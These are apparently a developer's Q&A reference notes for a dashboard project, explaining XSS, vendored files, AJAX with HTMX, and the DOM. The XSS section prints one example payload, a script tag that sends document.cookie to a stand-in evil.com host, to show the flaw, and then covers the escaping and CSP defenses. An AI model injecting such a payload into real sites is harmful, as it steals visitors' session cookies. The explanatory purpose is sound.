# Web Development Questions & Answers

Quick-reference notes on web dev concepts encountered while building and
customizing the environment dashboard.

---

## What Are XSS Attacks?

**XSS** (Cross-Site Scripting) is a security vulnerability where an attacker
injects malicious scripts into a web page that other users view. The browser
executes the injected script because it trusts code that comes from the server.

### How It Works

1. An attacker finds an input that gets reflected back in HTML without
   sanitization (a search box, comment field, URL parameter, etc.)
2. They craft input containing `<script>` tags or event handlers
3. When the page renders, the browser executes the injected JavaScript
4. The script can steal cookies/tokens, redirect users, modify the page,
   or make requests on behalf of the victim

### Example

Imagine a search page that shows "Results for: {query}" by inserting the
raw query into HTML:

```html
<!-- Vulnerable: raw insertion -->
<p>Results for: {{ query }}</p>

<!-- Attacker searches for: -->
<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>

<!-- Browser sees: -->
<p>Results for: <script>document.location='https://evil.com/steal?...'</script></p>
<!-- The script RUNS — cookies are sent to the attacker -->
```

### Types

| Type         | Description                                                |
| ------------ | ---------------------------------------------------------- |
| **Stored**   | Script is saved in the database (e.g., in a comment) and served to every visitor. Most dangerous. |
| **Reflected** | Script is in the URL/request and reflected back in the response. Requires tricking users into clicking a link. |
| **DOM-based** | Script manipulates the page's DOM directly via client-side JavaScript, never hitting the server. |

### How Our Dashboard Prevents XSS

- **Jinja2 autoescape=True** — all `{{ variable }}` outputs are automatically
  HTML-escaped. `<script>` becomes `&lt;script&gt;` which renders as text,
  not executable code.
- **No user-generated content** — the dashboard only displays system info
  collected locally. There's no user input that gets stored and re-displayed.
- **CSP headers on export** — the HTML export includes a Content-Security-Policy
  meta tag that blocks all scripts entirely.

### Takeaway

Always escape user input before inserting it into HTML. In Jinja2, this is
on by default (`autoescape=True`). Never use `{{ variable|safe }}` or
`Markup()` on untrusted data.

---

## What Are Vendored Files?

**Vendored files** are third-party library files (JavaScript, CSS, fonts)
that are copied directly into your project repository instead of being
installed via a package manager at build time.

### Common Misconception

> "Vendored files are the human-readable versions of .min files"

This is **not quite right**. The `.min` suffix means **minified** — whitespace,
comments, and long variable names removed to shrink the file. Vendored files
can be either minified or unminified:

| File                | Vendored? | Minified? | Readable? |
| ------------------- | --------- | --------- | --------- |
| `htmx.min.js`       | Yes       | Yes       | No — compressed one-liner |
| `htmx.js`           | Yes       | No        | Yes — full source with comments |
| `style.css`         | No        | No        | Yes — our own code |
| `pico.min.css`      | Yes       | Yes       | No — compressed |

**Vendored = copied into your repo.** Minified = compressed for file size.
They're independent concepts. You can vendor a minified file (common) or
vendor the full readable source (also fine).

### Why People Vendor Files

1. **No build step** — you don't need npm, Webpack, or any JavaScript tooling.
   Just commit the file and reference it in your HTML.
2. **Offline development** — works without internet. No CDN dependency.
3. **Version pinning** — you control exactly which version you're using.
   No surprise updates from a CDN.
4. **Reliability** — CDNs can go down, change URLs, or be blocked by
   firewalls. A vendored file is always available.
5. **Security** — a compromised CDN could serve malicious code. Vendored
   files are hash-verifiable in your git history.

### Why Some Projects Don't Vendor

- **Large dependency trees** — vendoring hundreds of npm packages is
  impractical. Use `node_modules/` (gitignored) + `package-lock.json` instead.
- **Automated updates** — package managers like npm/pip can update
  dependencies with security patches automatically.
- **Disk space** — vendored files bloat the repo.

### Our Dashboard's Approach

We vendor 3 small files in `static/`:

- `pico.min.css` — CSS framework (minified, ~12KB)
- `htmx.min.js` — HTMX library (minified, ~14KB)
- `alpine.min.js` — Alpine.js (minified, ~15KB)

We use the `.min` versions because we don't edit them — they're third-party
code. Our own `style.css` is **not** minified because we need to read and
edit it.

---

## What Is an AJAX Request?

**AJAX** (Asynchronous JavaScript and XML) is a technique for making HTTP
requests from JavaScript **without reloading the entire page**. Despite the
name, modern AJAX uses JSON (not XML) and the `fetch()` API (not XMLHttpRequest).

### The Problem AJAX Solves

Without AJAX, every interaction requires a **full page reload**:

1. User clicks a button
2. Browser sends a request to the server
3. Server sends back an **entire new HTML page**
4. Browser discards the current page, renders the new one
5. User sees a white flash, loses scroll position, etc.

With AJAX, JavaScript sends the request **in the background**:

1. User clicks a button
2. JavaScript sends a request (the page stays on screen)
3. Server sends back **just the data needed** (JSON or HTML fragment)
4. JavaScript updates **only the part of the page** that changed
5. User sees a smooth, instant update

### Example

```javascript
// Modern AJAX using fetch()
const response = await fetch('/api/summary');
const data = await response.json();
// Update just the summary section, not the whole page
document.getElementById('summary').textContent = data.hostname;
```

### HTMX as an Alternative

Our dashboard uses **HTMX** instead of writing AJAX by hand. HTMX does the
same thing but declaratively in HTML attributes:

```html
<!-- HTMX: when this loads, fetch the partial and swap it in -->
<div hx-get="/section/system" hx-trigger="load" hx-swap="innerHTML">
  Loading...
</div>
```

This is functionally identical to writing `fetch('/section/system')` in
JavaScript, but without any JavaScript code. HTMX sends the request and
swaps the HTML response into the element automatically.

### The Name Is Historical

- **Asynchronous** — the request happens in the background, not blocking
- **JavaScript** — the request is made from JS code
- **And** — just a conjunction
- **XML** — the original data format (now usually JSON or HTML)

The term "AJAX" was coined in 2005. Today people just say "API call" or
"fetch request" but the concept is the same.

---

## What Does DOM Mean?

**DOM** (Document Object Model) is the browser's internal representation of
an HTML page as a tree of objects. When you load an HTML page, the browser
parses the HTML text and builds a tree structure in memory — that tree is
the DOM.

### HTML vs DOM

```html
<!-- This is HTML (text in a file): -->
<html>
  <body>
    <h1>Hello</h1>
    <p>World</p>
  </body>
</html>
```

```text
The DOM (tree in memory):
document
└── html
    └── body
        ├── h1
        │   └── "Hello"
        └── p
            └── "World"
```

### Why It Matters

JavaScript interacts with the **DOM**, not the HTML file. When you write:

```javascript
document.getElementById('summary').textContent = 'New text';
```

You're modifying a **DOM node** (an object in memory). The browser instantly
re-renders the changed node on screen. The original HTML file on the server
is never modified.

### DOM Manipulation in Our Dashboard

- **HTMX** modifies the DOM by swapping HTML fragments into elements
  (e.g., replacing a "Loading..." div with actual section content).
- **Alpine.js** modifies the DOM reactively — when `x-data` state changes,
  Alpine updates the elements that depend on that state (show/hide, text).
- **PicoCSS** doesn't manipulate the DOM — it just styles existing DOM nodes
  via CSS selectors.

### Key DOM Methods

| Method                              | What it does                          |
| ----------------------------------- | ------------------------------------- |
| `document.getElementById('x')`      | Find element by its `id` attribute    |
| `document.querySelector('.class')`   | Find first element matching CSS selector |
| `document.querySelectorAll('div')`   | Find all matching elements            |
| `element.textContent = 'text'`       | Change an element's text              |
| `element.innerHTML = '<b>html</b>'`  | Change an element's HTML (be careful — XSS risk) |
| `element.style.display = 'none'`     | Change CSS properties directly        |
| `element.classList.add('active')`    | Add a CSS class to an element         |

### "Virtual DOM" (Not Used Here)

React, Vue, and similar frameworks use a "virtual DOM" — a lightweight copy
of the DOM in JavaScript. They compare the virtual DOM with the real DOM to
figure out the minimal set of changes needed. Our dashboard doesn't use a
virtual DOM because HTMX and Alpine.js manipulate the real DOM directly,
which is simpler for a server-rendered app.
